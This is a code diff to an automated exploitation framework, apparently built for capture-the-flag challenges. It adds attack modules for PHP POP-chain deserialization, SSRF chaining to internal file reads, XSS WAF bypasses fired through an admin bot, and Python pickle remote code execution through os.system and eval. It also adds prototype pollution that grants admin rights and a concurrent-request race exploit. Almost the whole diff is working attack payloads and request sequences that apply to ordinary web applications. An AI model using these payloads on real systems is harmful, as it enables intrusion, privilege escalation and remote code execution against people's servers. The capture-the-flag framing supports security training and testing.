+            'O:10:"FileReader":1:{s:6:"reader";O:9:"Formatter":1:{s:7:"handler";O:6:"Logger":1:{s:4:"file";s:10:"/etc/flag";}}}',
+        ]
+        for i, pop_payload in enumerate(pop_payloads):
+            steps.append({
+                "name": f"php_pop_unserialize_{i}",
+                "description": f"PHP POP chain: POST /unserialize with FileReader→Formatter→Logger chain (target=/flag{'.' + str(i) if i else ''})",
+                "method": "POST",
+                "path": "/unserialize",
+                "data": {"payload": pop_payload},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+            # Also try GET with payload param
+            steps.append({
+                "name": f"php_pop_unserialize_get_{i}",
+                "description": f"PHP POP chain: GET /unserialize?payload=...",
+                "method": "GET",
+                "path": "/unserialize",
+                "params": {"payload": pop_payload},
+                "extract_flag": True,
+            })
 
         # ---- PHP MD5 type juggling (0e collision) ----
         # md5($a)==md5($b) with different values whose md5 starts with 0e + digits
@@ -2747,6 +3135,16 @@ class SSRFMachine(RouteStateMachine):
     def __init__(self, target_url: str, param_name: str = "url", session=None):
         super().__init__(target_url, session)
         self._param_name = param_name
+
+    def _get_target_port(self) -> str:
+        """Extract port from target_url for self-referencing SSRF chains."""
+        parsed = urlparse(self.target_url)
+        if parsed.port:
+            return str(parsed.port)
+        # Default ports
+        if parsed.scheme == "https":
+            return "443"
+        return "80"
 
     def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
         params = blackboard_state.get("interesting_params", [])
@@ -2914,6 +3312,74 @@ class SSRFMachine(RouteStateMachine):
                 "path": "/",
                 "data": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>test</password></user>',
                 "headers": {"Content-Type": "application/xml"},
+                "extract_flag": True,
+            },
+            # --- Chained SSRF to internal LFI ---
+            # Use /fetch?url= to access internal endpoints that read local files
+            # The target's own port is extracted from self.target_url
+            {
+                "name": "ssrf_chain_internal_read_flag",
+                "description": "SSRF chain: /fetch → internal/read?file=/etc/flag",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://127.0.0.1:{self._get_target_port()}/internal/read?file=/etc/flag"},
+                "extract_flag": True,
+            },
+            {
+                "name": "ssrf_chain_internal_read_flag2",
+                "description": "SSRF chain: /fetch → internal/read?file=/flag",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://127.0.0.1:{self._get_target_port()}/internal/read?file=/flag"},
+                "extract_flag": True,
+            },
+            {
+                "name": "ssrf_chain_internal_read_flag_txt",
+                "description": "SSRF chain: /fetch → internal/read?file=/flag.txt",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://127.0.0.1:{self._get_target_port()}/internal/read?file=/flag.txt"},
+                "extract_flag": True,
+            },
+            {
+                "name": "ssrf_chain_internal_read_app_flag",
+                "description": "SSRF chain: /fetch → internal/read?file=/app/flag.txt",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://127.0.0.1:{self._get_target_port()}/internal/read?file=/app/flag.txt"},
+                "extract_flag": True,
+            },
+            {
+                "name": "ssrf_chain_internal_direct",
+                "description": "SSRF chain: /fetch → /internal (discover endpoints)",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://127.0.0.1:{self._get_target_port()}/internal"},
+                "extract_flag": True,
+            },
+            {
+                "name": "ssrf_chain_internal_flag_endpoint",
+                "description": "SSRF chain: /fetch → /internal/flag",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://127.0.0.1:{self._get_target_port()}/internal/flag"},
+                "extract_flag": True,
+            },
+            # Also try localhost and 0.0.0.0 variants
+            {
+                "name": "ssrf_chain_localhost_internal",
+                "description": "SSRF chain: /fetch → localhost internal/read",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://localhost:{self._get_target_port()}/internal/read?file=/etc/flag"},
+                "extract_flag": True,
+            },
+            {
+                "name": "ssrf_chain_zero_internal",
+                "description": "SSRF chain: /fetch → 0.0.0.0 internal/read",
+                "method": "GET",
+                "path": "/fetch",
+                "params": {param: f"http://0.0.0.0:{self._get_target_port()}/internal/read?file=/etc/flag"},
                 "extract_flag": True,
             },
         ]
@@ -3323,6 +3789,53 @@ class XSSMachine(RouteStateMachine):
             "description": "直接访问 /admin 检查 flag",
             "method": "GET",
             "path": "/admin",
+            "extract_flag": True,
+        })
+
+        # --- WAF bypass: event handler XSS (script tag blocked) ---
+        # Many WAFs block <script> but allow event handlers like onerror, onload
+        # Strategy: submit ONE event handler payload, then immediately trigger admin bot
+        waf_bypass_flows = [
+            ('<img src=x onerror=alert(1)>', "img_onerror"),
+            ('<body onload=alert(1)>', "body_onload"),
+            ('<input onfocus=alert(1) autofocus>', "input_onfocus"),
+            ('<img src=x onerror="fetch(\'/flag\').then(r=>r.text()).then(t=>document.title=t)">', "img_onerror_fetch"),
+            ('<svg onload=alert(1)>', "svg_onload"),
+        ]
+        # For each payload: submit to /submit, then trigger /report
+        for payload, tag in waf_bypass_flows:
+            steps.append({
+                "name": f"waf_bypass_submit_{tag}",
+                "description": f"WAF bypass: POST {tag} to /submit",
+                "method": "POST",
+                "path": "/submit",
+                "data": {"message": payload, "content": payload, "comment": payload},
+                "extract_flag": False,
+            })
+            steps.append({
+                "name": f"waf_bypass_report_{tag}",
+                "description": f"Trigger admin bot via GET /report after {tag}",
+                "method": "GET",
+                "path": "/report",
+                "extract_flag": True,
+            })
+
+        # Also try POST to /report (some challenges require POST)
+        steps.append({
+            "name": "waf_bypass_trigger_report_post",
+            "description": "Trigger admin bot via POST /report",
+            "method": "POST",
+            "path": "/report",
+            "data": {"url": self.target_url},
+            "extract_flag": True,
+        })
+
+        # Check /flag endpoint after admin bot triggers
+        steps.append({
+            "name": "waf_bypass_check_flag",
+            "description": "Check /flag after admin bot trigger",
+            "method": "GET",
+            "path": "/flag",
             "extract_flag": True,
         })
 
@@ -3880,6 +4393,403 @@ class WebSocketMachine(RouteStateMachine):
 
 
 # ---------------------------------------------------------------------------
+# Deserialization State Machine (Pickle/Python RCE)
+# ---------------------------------------------------------------------------
+
+class DeserializationMachine(RouteStateMachine):
+    """State machine for deserialization attacks (pickle RCE, etc.).
+
+    Targets Python applications that use pickle.loads() on user input.
+    Submits base64-encoded pickle payloads with RCE opcodes.
+    """
+
+    route = "deserialization"
+
+    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
+        tech_stack = blackboard_state.get("tech_stack", [])
+        tech_str = str(tech_stack).lower()
+        if any(t in tech_str for t in ["python", "flask", "django", "pickle", "deserializ"]):
+            return True, "Python/pickle indicators detected"
+        # Check for hints in response snippets
+        response_snippets = blackboard_state.get("response_snippets", [])
+        for snippet in response_snippets:
+            if any(kw in str(snippet).lower() for kw in ["pickle", "deserializ", "session_data", "serializ"]):
+                return True, "Deserialization hints in response"
+        return True, "Deserialization probe is cheap — always worth trying"
+
+    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
+        return [
+            ("pickle_hint", "/", None),
+            ("submit_page", "/submit", None),
+        ]
+
+    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
+        """Check for pickle/deserialization hints on the target."""
+        return self._get(payload_template)
+
+    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
+        text = response.text.lower() if response.text else ""
+        if any(kw in text for kw in ["pickle", "deserializ", "session_data", "serializ", "unserializ"]):
+            return EvidenceScore("deserialization", 0.8, probe_name,
+                                 "Deserialization/pickle hints found")
+        if "submit" in text or "data" in text:
+            return EvidenceScore("deserialization", 0.3, probe_name,
+                                 "Submit form found")
+        return EvidenceScore("deserialization", 0.1, probe_name, "No clear indicators")
+
+    def get_exploit_steps(self) -> List[Dict[str, Any]]:
+        """Pickle RCE exploit steps.
+
+        Submits base64-encoded pickle payloads with RCE opcodes to /submit.
+        """
+        import base64 as _b64
+        steps: List[Dict[str, Any]] = []
+
+        # Pickle payloads with various RCE opcodes
+        pickle_payloads = [
+            # cos\nsystem\n(S'cat /flag'\ntR.  — most common
+            _b64.b64encode(b"cos\nsystem\n(S'cat /flag'\ntR.").decode(),
+            # cos\nsystem\n(S'cat /etc/flag'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'cat /etc/flag'\ntR.").decode(),
+            # cos\npopen\n(S'cat /flag'\ntR.
+            _b64.b64encode(b"cos\npopen\n(S'cat /flag'\ntR.").decode(),
+            # cbuiltins\neval\n(S'__import__(\"os\").system(\"cat /flag\")'\ntR.
+            _b64.b64encode(b"cbuiltins\neval\n(S'__import__(\"os\").system(\"cat /flag\")'\ntR.").decode(),
+            # cos\nsystem\n(S'cat /flag.txt'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'cat /flag.txt'\ntR.").decode(),
+            # cos\nsystem\n(S'id'\ntR.
+            _b64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
+        ]
+
+        for i, pkl_payload in enumerate(pickle_payloads):
+            # POST as form data with data= parameter (most common)
+            steps.append({
+                "name": f"pickle_rce_form_{i}",
+                "description": f"Pickle RCE: POST /submit data={pkl_payload[:20]}...",
+                "method": "POST",
+                "path": "/submit",
+                "data": {"data": pkl_payload},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+
+        # Also try with cookie-based delivery
+        for i, pkl_payload in enumerate(pickle_payloads[:3]):
+            steps.append({
+                "name": f"pickle_rce_cookie_{i}",
+                "description": f"Pickle RCE: GET / with session_data cookie",
+                "method": "GET",
+                "path": "/submit",
+                "headers": {"Cookie": f"session_data={pkl_payload}"},
+                "extract_flag": True,
+            })
+
+        # Try alternative endpoints
+        for alt_path in ["/api/deserialize", "/api/load", "/deserialize", "/pickle", "/api/submit"]:
+            steps.append({
+                "name": f"pickle_rce_{alt_path.strip('/').replace('/', '_')}",
+                "description": f"Pickle RCE on {alt_path}",
+                "method": "POST",
+                "path": alt_path,
+                "data": {"data": pickle_payloads[0]},
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+
+        # POST as raw body
+        steps.append({
+            "name": "pickle_rce_raw_body",
+            "description": "Pickle RCE: POST /submit raw base64 body",
+            "method": "POST",
+            "path": "/submit",
+            "data": pickle_payloads[0],
+            "headers": {"Content-Type": "application/octet-stream"},
+            "extract_flag": True,
+        })
+
+        # POST as JSON
+        steps.append({
+            "name": "pickle_rce_json",
+            "description": "Pickle RCE: POST /submit JSON data field",
+            "method": "POST",
+            "path": "/submit",
+            "json": {"data": pickle_payloads[0]},
+            "headers": {"Content-Type": "application/json"},
+            "extract_flag": True,
+        })
+
+        return steps
+
+
+# ---------------------------------------------------------------------------
+# Prototype Pollution State Machine
+# ---------------------------------------------------------------------------
+
+class PrototypePollutionMachine(RouteStateMachine):
+    """State machine for prototype pollution attacks.
+
+    Targets Express/Node.js applications using lodash.merge or similar
+    deep-merge functions that allow __proto__ pollution.
+    """
+
+    route = "prototype_pollution"
+
+    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
+        tech_stack = blackboard_state.get("tech_stack", [])
+        tech_str = str(tech_stack).lower()
+        headers_seen = blackboard_state.get("headers", {})
+        powered_by = headers_seen.get("x-powered-by", "")
+
+        if any(t in tech_str for t in ["express", "node", "lodash", "javascript"]):
+            return True, "Node.js/Express indicators detected"
+        if "express" in powered_by.lower():
+            return True, "X-Powered-By: Express header detected"
+        return True, "Prototype pollution probe is cheap — always worth trying"
+
+    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
+        return [
+            ("api_config", "/api/config", None),
+            ("admin_page", "/admin", None),
+        ]
+
+    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
+        """Check for Express/Node.js indicators."""
+        return self._get(payload_template)
+
+    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
+        text = response.text.lower() if response.text else ""
+        powered_by = response.headers.get("X-Powered-By", "").lower()
+
+        if "express" in powered_by:
+            return EvidenceScore("prototype_pollution", 0.7, probe_name,
+                                 "Express server detected")
+        if response.status_code == 200 and "json" in response.headers.get("Content-Type", "").lower():
+            return EvidenceScore("prototype_pollution", 0.5, probe_name,
+                                 "JSON API endpoint detected")
+        if response.status_code in (401, 403) and probe_name == "admin_page":
+            return EvidenceScore("prototype_pollution", 0.6, probe_name,
+                                 "Admin page requires auth — pollution may bypass")
+        return EvidenceScore("prototype_pollution", 0.1, probe_name, "No clear indicators")
+
+    def get_exploit_steps(self) -> List[Dict[str, Any]]:
+        """Prototype pollution exploit steps.
+
+        1. POST __proto__ payloads to /api/config (or similar merge endpoints)
+        2. Check /admin for flag after pollution
+        """
+        steps: List[Dict[str, Any]] = []
+
+        # Primary attack: POST to /api/config then immediately check /admin
+        # This is the most common pattern — do it first
+        steps.append({
+            "name": "proto_config_isAdmin",
+            "description": "Prototype pollution: __proto__.isAdmin on /api/config",
+            "method": "POST",
+            "path": "/api/config",
+            "json": {"__proto__": {"isAdmin": True}},
+            "headers": {"Content-Type": "application/json"},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "proto_check_admin_after_config",
+            "description": "Check /admin after pollution",
+            "method": "GET",
+            "path": "/admin",
+            "extract_flag": True,
+        })
+
+        # Try constructor.prototype path
+        steps.append({
+            "name": "proto_constructor_config",
+            "description": "Prototype pollution: constructor.prototype on /api/config",
+            "method": "POST",
+            "path": "/api/config",
+            "json": {"constructor": {"prototype": {"isAdmin": True}}},
+            "headers": {"Content-Type": "application/json"},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "proto_check_admin_after_constructor",
+            "description": "Check /admin after constructor pollution",
+            "method": "GET",
+            "path": "/admin",
+            "extract_flag": True,
+        })
+
+        # Extended payload with multiple properties
+        steps.append({
+            "name": "proto_config_multi",
+            "description": "Prototype pollution: multiple admin properties",
+            "method": "POST",
+            "path": "/api/config",
+            "json": {"__proto__": {"isAdmin": True, "role": "admin", "admin": True}},
+            "headers": {"Content-Type": "application/json"},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "proto_check_admin_after_multi",
+            "description": "Check /admin after multi-property pollution",
+            "method": "GET",
+            "path": "/admin",
+            "extract_flag": True,
+        })
+
+        # Try other merge endpoints
+        for path in ["/api/settings", "/api/merge", "/api/update", "/api/user"]:
+            steps.append({
+                "name": f"proto_{path.strip('/').replace('/', '_')}",
+                "description": f"Prototype pollution on {path}",
+                "method": "POST",
+                "path": path,
+                "json": {"__proto__": {"isAdmin": True}},
+                "headers": {"Content-Type": "application/json"},
+                "extract_flag": False,
+            })
+
+        # Check other admin paths
+        for admin_path in ["/api/admin", "/flag", "/api/flag", "/dashboard"]:
+            steps.append({
+                "name": f"proto_check_{admin_path.strip('/').replace('/', '_')}",
+                "description": f"Check {admin_path} after pollution",
+                "method": "GET",
+                "path": admin_path,
+                "extract_flag": True,
+            })
+
+        return steps
+
+
+# ---------------------------------------------------------------------------
+# Race Condition State Machine
+# ---------------------------------------------------------------------------
+
+class RaceMachine(RouteStateMachine):
+    """State machine for race condition (TOCTOU) exploitation.
+
+    Sends concurrent requests to exploit time-of-check-to-time-of-use gaps.
+    Typical pattern: concurrent purchases that overdraw a balance.
+    """
+
+    route = "race"
+
+    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
+        return True, "Race condition probe is cheap — always worth trying"
+
+    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
+        return [
+            ("balance_check", "/api/balance", None),
+            ("purchase_check", "/api/purchase", None),
+            ("root_check", "/", None),
+        ]
+
+    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
+        """Check for race-condition-relevant endpoints."""
+        try:
+            return self._get(payload_template)
+        except requests.RequestException:
+            resp = requests.Response()
+            resp.status_code = 0
+            resp._content = b""
+            return resp
+
+    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
+        text = response.text.lower() if response.text else ""
+        if any(kw in text for kw in ["balance", "purchase", "buy", "shop", "credit", "wallet"]):
+            return EvidenceScore("race", 0.7, probe_name, "Balance/purchase API detected")
+        if response.status_code == 200:
+            return EvidenceScore("race", 0.3, probe_name, "Endpoint exists")
+        return EvidenceScore("race", 0.1, probe_name, "No race indicators")
+
+    def get_exploit_steps(self) -> List[Dict[str, Any]]:
+        """Return exploit steps — actual exploitation is in run_exploit() override."""
+        return [
+            {"name": "reset", "method": "POST", "path": "/api/reset",
+             "description": "Reset balance", "extract_flag": False},
+            {"name": "race_exploit", "method": "POST", "path": "/api/purchase",
+             "description": "Concurrent purchase requests (race)", "extract_flag": False},
+            {"name": "check_flag", "method": "GET", "path": "/api/flag",
+             "description": "Check flag after overdraft", "extract_flag": True},
+        ]
+
+    def run_exploit(self) -> Tuple[bool, Optional[str]]:
+        """Override to handle concurrent requests for race condition exploitation."""
+        import concurrent.futures as _cf
+        import threading as _threading
+
+        # Step 1: Reset balance
+        try:
+            self._post("/api/reset")
+        except requests.RequestException:
+            pass
+
+        # Step 2: Send concurrent purchase requests to exploit TOCTOU window
+        def _purchase():
+            try:
+                url = f"{self.target_url}/api/purchase"
+                # Use a fresh session per thread to avoid connection sharing issues
+                s = requests.Session()
+                return s.post(url, timeout=5)
+            except Exception:
+                return None
+
+        # Send 5 concurrent requests to exploit the race window
+        with _cf.ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(_purchase) for _ in range(5)]
+            _cf.wait(futures, timeout=10)
+
+        # Brief pause for server to process all deductions
+        time.sleep(0.3)
+
+        # Step 3: Check for flag
+        try:
+            resp = self._get("/api/flag")
+            flag = self._check_flag(resp.text)
+            if flag:
+                self.state.progress = "done"
+                self.state.stop_reason = "flag_found"
+                return True, flag
+        except requests.RequestException:
+            pass
+
+        # Step 4: Check balance endpoint for flag
+        try:
+            resp2 = self._get("/api/balance")
+            flag2 = self._check_flag(resp2.text)
+            if flag2:
+                self.state.progress = "done"
+                self.state.stop_reason = "flag_found"
+                return True, flag2
+        except requests.RequestException:
+            pass
+
+        # Step 5: Try again with more concurrent requests
+        try:
+            self._post("/api/reset")
+        except requests.RequestException:
+            pass
+
+        with _cf.ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(_purchase) for _ in range(10)]
+            _cf.wait(futures, timeout=10)
+
+        time.sleep(0.3)
+
+        try:
+            resp = self._get("/api/flag")
+            flag = self._check_flag(resp.text)
+            if flag:
+                self.state.progress = "done"
+                self.state.stop_reason = "flag_found"
+                return True, flag
+        except requests.RequestException:
+            pass
+
+        self.state.progress = "done"
+        self.state.stop_reason = "race_exploit_no_flag"
+        return False, None
+
+
+# ---------------------------------------------------------------------------
 # Machine factory
 # ---------------------------------------------------------------------------
 
@@ -3897,6 +4807,7 @@ MACHINE_REGISTRY: Dict[str, type] = {
     "xss": XSSMachine,
     "graphql": GraphQLMachine,
     "websocket": WebSocketMachine,
+    "race": RaceMachine,
 }
 
 
@@ -3918,7 +4829,7 @@ def create_machine(
         return cls(target_url, param_name=param_name, session=session)
     if route == "jwt" and token:
         return cls(target_url, token=token, session=session)
-    if route == "upload" and upload_path:
+    if route in ("upload", "deserialization") and upload_path:
         return cls(target_url, upload_path=upload_path, session=session)
     if route == "php_pop" and framework:
         return cls(target_url, framework=framework, session=session)
@@ -4125,7 +5036,9 @@ def run_route(
         "jwt", "graphql", "websocket", "xss",
         "lfi", "ssti", "sqli", "cmdi",
         "ssrf", "upload", "idor", "php_pop",
-        "xxe", "auth_logic",
+        "xxe", "auth_logic", "nosql",
+        "deserialization", "prototype_pollution",
+        "race",
     }
     if route in always_exploit_routes:
         found, flag = machine.run_exploit()
@@ -4254,7 +5167,12 @@ def run_route(
 try:
     from autopnex.ctf.routes.xxe import XXEMachine
     from autopnex.ctf.routes.auth_logic import AuthLogicMachine
+    from autopnex.ctf.routes.nosql import NoSQLRouteStateMachine
     MACHINE_REGISTRY["xxe"] = XXEMachine
     MACHINE_REGISTRY["auth_logic"] = AuthLogicMachine
+    MACHINE_REGISTRY["nosql"] = NoSQLRouteStateMachine
+    # Route aliases for benchmark expected_route matching
+    MACHINE_REGISTRY["deserialization"] = DeserializationMachine
+    MACHINE_REGISTRY["prototype_pollution"] = PrototypePollutionMachine
 except ImportError:
     pass
